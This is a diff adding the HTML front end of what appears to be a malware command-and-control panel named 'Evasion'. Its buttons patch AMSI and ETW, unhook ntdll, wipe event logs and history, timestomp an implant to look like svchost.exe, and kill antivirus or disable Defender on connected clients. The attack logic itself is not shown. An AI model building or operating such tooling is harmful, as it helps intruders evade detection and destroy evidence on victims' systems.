@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Evasion</title>
+  <link rel="stylesheet" href="evasion.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Evasion</h1>
+    <span class="tag">amsi · etw · anti-forensics</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+        <button id="recon" class="btn primary block">recon defenses</button>
+      </div>
+
+      <div class="card">
+        <h2>memory patches (silent)</h2>
+        <div class="hint">these modify only this process — no files touched, no services stopped.</div>
+        <div class="actions">
+          <button id="patchAmsi" class="btn">patch amsi</button>
+          <button id="patchEtw" class="btn">patch etw</button>
+        </div>
+        <button id="unhook" class="btn block">unhook ntdll</button>
+        <button id="harden" class="btn primary block">apply full set</button>
+      </div>
+
+      <div class="card">
+        <h2>anti-forensics</h2>
+        <label for="eventLogs">event logs to clear (comma separated, blank = defaults)</label>
+        <input id="eventLogs" placeholder="Security,System,Application" />
+        <div class="checks">
+          <label><input type="checkbox" id="wipePrefetch" checked /> delete prefetch entries</label>
+          <label><input type="checkbox" id="wipeRecent" checked /> delete recent files + ps history</label>
+        </div>
+        <button id="wipeLogs" class="btn block">wipe</button>
+      </div>
+
+      <div class="card">
+        <h2>timestomp</h2>
+        <label for="timestompPath">target file (to modify)</label>
+        <input id="timestompPath" placeholder="C:\Users\x\AppData\...\agent.exe" />
+        <label for="timestompFrom">copy timestamps from</label>
+        <input id="timestompFrom" placeholder="C:\Windows\System32\svchost.exe" />
+        <button id="timestomp" class="btn block">apply</button>
+      </div>
+
+      <div class="card danger-card">
+        <h2>loud actions</h2>
+        <div class="hint warn">these generate the alerts you are trying to avoid. last resort only.</div>
+        <div class="actions">
+          <button id="killAv" class="btn danger">kill av</button>
+          <button id="disableDefender" class="btn danger">disable defender</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>defense posture</h2>
+        <div id="posture" class="info empty">not probed — run recon</div>
+      </div>
+
+      <div class="card">
+        <h2>actions <span id="actCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>action</th><th>result</th><th>detail</th></tr></thead>
+          <tbody id="actBody"></tbody>
+        </table>
+        <div id="actEmpty" class="empty">nothing applied yet</div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="evasion.js"></script>
+</body>
+</html>
